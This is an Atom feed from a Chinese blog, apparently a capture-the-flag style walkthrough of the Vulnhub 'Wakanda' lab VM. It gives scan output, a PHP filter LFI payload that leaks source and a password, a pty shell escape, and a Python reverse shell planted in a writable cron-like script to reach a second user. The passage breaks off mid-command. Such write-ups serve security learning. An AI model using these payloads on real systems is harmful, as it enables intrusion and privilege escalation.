<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C0debreak&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-06-17T17:43:52.905Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>P0tato</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnhub靶机渗透——Wakanda</title>
    <link href="http://yoursite.com/2020/06/17/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Wakanda/"/>
    <id>http://yoursite.com/2020/06/17/Vulnhub靶机渗透——Wakanda/</id>
    <published>2020-06-16T16:26:44.916Z</published>
    <updated>2020-06-17T17:43:52.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>靶机地址：<a href="https://www.vulnhub.com/entry/wakanda-1,251/#" target="_blank" rel="noopener">https://www.vulnhub.com/entry/wakanda-1,251/#</a></p><p>使用VM VirtualBox运行靶机，配置运行kali的VMware和运行靶机的VM VirtualBox均使用桥接网卡模式，这样kali和目的靶机就在同一个局域网中，可以开始后续的测试了。</p><h2 id="0x01-目标探测"><a href="#0x01-目标探测" class="headerlink" title="0x01 目标探测"></a>0x01 目标探测</h2><p>我们先使用<code>ipconfig</code>命令来查看下本地ip，然后再使用<code>netdiscover</code>命令和<code>arp -l</code>命令来探测局域网内有哪些存活的主机。</p><a id="more"></a><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ifconfig</span></span><br><span class="line">eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500</span><br><span class="line">        inet 192.168.199.211  netmask 255.255.255.0  broadcast 192.168.199.255</span><br><span class="line">        inet6 fe80::20c:29ff:fef9:c363  prefixlen 64  scopeid 0x20<link></span><br><span class="line">        ether 00:0c:29:f9:c3:63  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 570  bytes 187830 (183.4 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 73307  bytes 4399916 (4.1 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">......</span><br></pre></td></tr></tbody></table></figure><p>kali在eth0上的IP地址和掩码为<code>192.168.199.211/24</code>。<code>netdiscover</code>和<code>arp -l</code>结果如下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># netdiscover -i eth0</span></span><br><span class="line">Currently scanning: 172.16.28.0/16   |   Screen View: Unique Hosts       </span><br><span class="line">                                                                          </span><br><span class="line"> 18 Captured ARP Req/Rep packets, from 11 hosts.   Total size: 1080       </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.199.1   d4:ee:07:60:2d:18      5     300  HIWIFI Co., Ltd.       </span><br><span class="line"> 192.168.199.122 04:cf:8c:24:ec:b2      3     180  XIAOMI Electronics,CO.,</span><br><span class="line"> 192.168.199.248 08:1f:71:30:18:db      1      60  TP-LINK TECHNOLOGIES CO</span><br><span class="line"> 192.168.199.105 08:00:27:3c:1e:db      2     120  PCS Systemtechnik GmbH </span><br><span class="line"> 192.168.199.123 44:23:7c:7b:79:bf      1      60  Beijing Xiaomi Mobile S</span><br><span class="line"> 192.168.199.151 00:02:ee:90:5c:3d      1      60  Nokia Danmark A/S      </span><br><span class="line"> 192.168.199.167 50:ec:50:39:89:bd      1      60  Beijing Xiaomi Mobile S</span><br><span class="line"> 192.168.199.183 44:23:7c:6d:18:07      1      60  Beijing Xiaomi Mobile S</span><br><span class="line"> 192.168.199.201 44:23:7c:84:61:e9      1      60  Beijing Xiaomi Mobile S</span><br><span class="line"> 192.168.199.188 cc:66:0a:2f:ec:be      1      60  Apple, Inc.            </span><br><span class="line"> 192.168.199.247 a4:cf:12:c6:bd:d3      1      60  Espressif Inc.</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># arp-scan -l</span></span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:f9:c3:63, IPv4: 192.168.199.211</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.199.1   d4:ee:07:60:2d:18       HIWIFI Co., Ltd.</span><br><span class="line">192.168.199.105 08:00:27:3c:1e:db       PCS Systemtechnik GmbH</span><br><span class="line">192.168.199.105 08:00:27:3c:1e:db       PCS Systemtechnik GmbH (DUP: 2)</span><br><span class="line">192.168.199.122 04:cf:8c:24:ec:b2       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.199.123 44:23:7c:7b:79:bf       Beijing Xiaomi Mobile Software Co., Ltd</span><br><span class="line">192.168.199.151 00:02:ee:90:5c:3d       Nokia Danmark A/S</span><br><span class="line">192.168.199.167 50:ec:50:39:89:bd       Beijing Xiaomi Mobile Software Co., Ltd</span><br><span class="line">192.168.199.201 44:23:7c:84:61:e9       Beijing Xiaomi Mobile Software Co., Ltd</span><br><span class="line">192.168.199.188 cc:66:0a:2f:ec:be       Apple, Inc.</span><br><span class="line">192.168.199.247 a4:cf:12:c6:bd:d3       Espressif Inc.</span><br><span class="line">192.168.199.101 12:31:0a:85:a6:09       (Unknown: locally administered)</span><br><span class="line"></span><br><span class="line">11 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned <span class="keyword">in</span> 2.323 seconds (110.20 hosts/sec). 11 responded</span><br></pre></td></tr></tbody></table></figure><p>可以看到，除了<code>192.168.199.105 08:00:27:3c:1e:db       PCS Systemtechnik GmbH</code>这个ip之外，其他应该都是正常使用的ip，<code>192.168.199.105</code>应该就是我们这次靶机的ip。</p><h2 id="0x02-端口-服务扫描"><a href="#0x02-端口-服务扫描" class="headerlink" title="0x02 端口/服务扫描"></a>0x02 端口/服务扫描</h2><p>先使用nmap扫描靶机开放端口，结果如下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -sV 192.168.199.105</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 10:15 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.199.105</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">34509/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.58 seconds</span><br></pre></td></tr></tbody></table></figure><p>比较明显的是开放了80的web端口和3333的ssh端口，另外还有34509端口比较可疑。网页打开看了一下，是一个振金市场的主页。</p><p><a href="https://sbimg.cn/image/0Wl9K" target="_blank" rel="noopener"><img src="https://wx1.sbimg.cn/2020/06/17/image-20200617004853075.png" alt="image-20200617004853075.png"></a></p><p>使用nikto扫描下网站，看网站是否存在漏洞或者信息泄露：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nikto -h http://192.168.199.105</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.199.105</span><br><span class="line">+ Target Hostname:    192.168.199.105</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-06-16 12:51:18 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.10 (Debian)</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ No CGI Directories found (use <span class="string">'-C all'</span> to force check all possible <span class="built_in">dirs</span>)</span><br><span class="line">+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL <span class="keyword">for</span> the 2.x branch.</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-06-16 12:52:17 (GMT-4) (59 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></tbody></table></figure><p>但是没发现什么有用的信息，于是接着用dirb来暴力枚举下网站目录：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.199.105                                             </span></span><br><span class="line">-----------------                                                                   </span><br><span class="line">DIRB v2.22                                                                           </span><br><span class="line">By The Dark Raver                                                                   </span><br><span class="line">-----------------                                                                   </span><br><span class="line">START_TIME: Tue Jun 16 12:49:43 2020                                                 </span><br><span class="line">URL_BASE: http://192.168.199.105/                                                   </span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line">---- Scanning URL: http://192.168.199.105/ ----</span><br><span class="line">+ http://192.168.199.105/admin (CODE:200|SIZE:0)                                     </span><br><span class="line">+ http://192.168.199.105/backup (CODE:200|SIZE:0)                                   </span><br><span class="line">+ http://192.168.199.105/index.php (CODE:200|SIZE:1527)                             </span><br><span class="line">+ http://192.168.199.105/secret (CODE:200|SIZE:0)                                   </span><br><span class="line">+ http://192.168.199.105/server-status (CODE:403|SIZE:303)                           </span><br><span class="line">+ http://192.168.199.105/shell (CODE:200|SIZE:0)                                      </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Jun 16 12:49:47 2020</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 6</span><br></pre></td></tr></tbody></table></figure><p>挨个访问了下，似乎没什么有用的东西。不过查看网页源码的过程中，发现一条有趣的注释：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link active"</span> <span class="attr">href</span>=<span class="string">"?lang=fr"</span>></span>Fr/a></span><br></pre></td></tr></tbody></table></figure><p><code>lang</code>代表可以切换的语言，尝试直接在url中包含<code>lang</code>参数<code>？lang=fr</code>，发现页面中间的部分语言切换成了法语。这里可能存在本地文件包含(LFI)和远程文件包含(RFI)漏洞。</p><h2 id="0x03-LFI获取源码"><a href="#0x03-LFI获取源码" class="headerlink" title="0x03 LFI获取源码"></a>0x03 LFI获取源码</h2><p>考虑到可能存在LFI或者RFI漏洞，因为除了<code>index.php</code>其他的页面似乎没有什么可以突破的点，尝试用php伪协议读取下<code>index.php</code>的源码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.199.105/?lang=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></tbody></table></figure><p>这里我们获取到的是base64之后的页面源码，解密后在开头部分发现一部分php源码，包含了一个密码：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><?php</span></span><br><span class="line">$password =<span class="string">"Niamey4Ever227!!!"</span> ;<span class="comment">//I have to remember it</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'lang'</span>]))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'lang'</span>].<span class="string">".php"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?></span></span><br></pre></td></tr></tbody></table></figure><p>另外原始网页源码中还包含了一部分明文，标明了作者是<code>mamadou</code>：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Vibranium Market</span><br><span class="line">Home</span><br><span class="line">Coming soon</span><br><span class="line"></span><br><span class="line">Made by@mamadou</span><br></pre></td></tr></tbody></table></figure><p>联想到之前nmap扫描到的ssh服务，尝试用这个用户名<code>mamadou</code>和密码<code>Niamey4Ever227!!!</code>登录下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh mamadou@192.168.199.105 -p 3333</span></span><br><span class="line">mamadou@192.168.199.105<span class="string">'s password: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Sat Feb 29 14:22:02 2020 from kali.lan</span></span><br><span class="line"><span class="string">Python 2.7.9 (default, Jun 29 2016, 13:08:31) </span></span><br><span class="line"><span class="string">[GCC 4.9.2] on linux2</span></span><br><span class="line"><span class="string">Type "help", "copyright", "credits" or "license" for more information.</span></span><br><span class="line"><span class="string">>>></span></span><br></pre></td></tr></tbody></table></figure><h2 id="0x04-切换Bash"><a href="#0x04-切换Bash" class="headerlink" title="0x04 切换Bash"></a>0x04 切换Bash</h2><p>ssh连过去之后是一个python的shell，不是太方便操作。先用python切换到<code>/bin/bash</code>，切换之后是<code>mamadou</code>的用户。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">>>> import pty</span><br><span class="line">>>> pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line">mamadou@Wakanda1:~$</span><br></pre></td></tr></tbody></table></figure><p>先直接使用<code>find</code>命令全局搜索一下<code>flag</code>哈哈哈，注意这里如果我们直接搜索的话会出现一大堆没有权限的返回结果，可以使用<code>2>/dev/null</code>来丢弃掉所有的错误输出。<code>/dev/null</code>是Linux一个特殊的设备文件，这个文件接收到的任何数据都会被丢弃，通常也被成为位桶(bit bucket)。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:~$ find / -name <span class="string">"flag*"</span> 2>/dev/null</span><br><span class="line">/sys/devices/pci0000:00/0000:00:03.0/net/eth0/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">/home/devops/flag2.txt</span><br><span class="line">/home/mamadou/flag1.txt</span><br></pre></td></tr></tbody></table></figure><p>发现了<code>mamadou</code>和<code>devops</code>两个目录下的flag文件，<code>mamadou</code>目录下的<code>flag1.txt</code>可以直接访问，<code>devops</code>则没有权限访问。现在我们拿到第一个flag了~</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:~$ cat /home/mamadou/flag1.txt </span><br><span class="line">Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</span><br><span class="line">mamadou@Wakanda1:~$ cat /home/devops/flag2.txt </span><br><span class="line">cat: /home/devops/flag2.txt: Permission denied</span><br></pre></td></tr></tbody></table></figure><p><code>mamadou</code>用户不出意外看起来没办法直接sudo，只能找找有没有什么其他曲线救国的方法。</p><h2 id="0x05-利用Devops用户权限-amp-amp-反向连接"><a href="#0x05-利用Devops用户权限-amp-amp-反向连接" class="headerlink" title="0x05 利用Devops用户权限&&反向连接"></a>0x05 利用Devops用户权限&&反向连接</h2><p>先使用<code>cat /etc/passwd</code>查看下靶机上的用户及权限：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/var/mail$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">Debian-exim:x:104:109::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:105:110::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:106:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mamadou:x:1000:1000:Mamadou,,,,Developper:/home/mamadou:/usr/bin/python</span><br><span class="line">devops:x:1001:1002:,,,:/home/devops:/bin/bash</span><br></pre></td></tr></tbody></table></figure><p>发现之前发现的devops是有<code>/bin/bash</code>权限的，可以查看下用户为devops的文件，看是否能提权到devops用户权限，有以下一些可能存在利用点的文件。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/var/mail$ find / -user devops 2>/dev/null</span><br><span class="line">/srv/.antivirus.py</span><br><span class="line">/tmp/<span class="built_in">test</span></span><br><span class="line">/home/devops</span><br><span class="line">/home/devops/.bashrc</span><br><span class="line">/home/devops/.profile</span><br><span class="line">/home/devops/.bash_logout</span><br><span class="line">/home/devops/flag2.txt</span><br></pre></td></tr></tbody></table></figure><p>挨个查看下文件权限。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/home/devops$ ls -la</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 2 devops developer 4096 Aug  5  2018 .</span><br><span class="line">drwxr-xr-x 4 root   root      4096 Aug  1  2018 ..</span><br><span class="line">lrwxrwxrwx 1 root   root         9 Aug  5  2018 .bash_history -> /dev/null</span><br><span class="line">-rw-r--r-- 1 devops developer  220 Aug  1  2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 devops developer 3515 Aug  1  2018 .bashrc</span><br><span class="line">-rw-r----- 1 devops developer   42 Aug  1  2018 flag2.txt</span><br><span class="line">-rw-r--r-- 1 devops developer  675 Aug  1  2018 .profile</span><br><span class="line">mamadou@Wakanda1:/home/devops$ <span class="built_in">cd</span> /srv/</span><br><span class="line">mamadou@Wakanda1:/srv$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root   root      4096 Aug  1  2018 .</span><br><span class="line">drwxr-xr-x 22 root   root      4096 Aug  1  2018 ..</span><br><span class="line">-rw-r--rw-  1 devops developer  256 Feb 29 12:06 .antivirus.py</span><br></pre></td></tr></tbody></table></figure><p>发现<code>/srv/.antivirus.py</code>的隐藏文件权限为646，任何用户都可以对其进行修改，文件中python源码如下。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">'/tmp/test'</span>,<span class="string">'w'</span>).write(<span class="string">'test'</span>)</span><br></pre></td></tr></tbody></table></figure><p>并且系统后台一直有进程在重复运行<code>/srv/.antivirus.py</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devops    1366     1  0 12:09 ?        00:00:00 python /srv/.antivirus.py</span><br></pre></td></tr></tbody></table></figure><p><code>/srv/.antivirus.py</code>用户权限是devops，如果我们修改<code>/srv/.antiviru.py</code>文件中的内容为python的反向连接脚本，那后台的进程在执行<code>/srv/.antivirus.py</code>脚本时就会运行我们的反向连接脚本，从而我们可以获得到devops的反向shell。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/srv$ cat ./.antivirus.py </span><br><span class="line">open(<span class="string">'/tmp/test'</span>,<span class="string">'w'</span>).write(<span class="string">'test'</span>)</span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.199.211"</span>,<span class="number">1238</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/bash"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></tbody></table></figure><p>因为之前暂停过虚拟机，后台python进程已经很久没有运行过了，于是我们先监听端口然后重启下靶机，然后我们监听端口的bash就成功获得了shell连接。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 1235</span></span><br><span class="line">listening on [any] 1235 ...</span><br><span class="line">connect to [192.168.199.211] from Wakanda1.lan [192.168.199.105] 37062</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (479): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">devops@Wakanda1:/$ id</span><br><span class="line">id                                                                                                     </span><br><span class="line">uid=1001(devops) gid=1002(developer) groups=1002(developer)</span><br></pre></td></tr></tbody></table></figure><p>得到了第二个flag~</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">devops@Wakanda1:/$ <span class="built_in">cd</span> /home/devops</span><br><span class="line"><span class="built_in">cd</span> /home/devops</span><br><span class="line">devops@Wakanda1:~$ ls</span><br><span 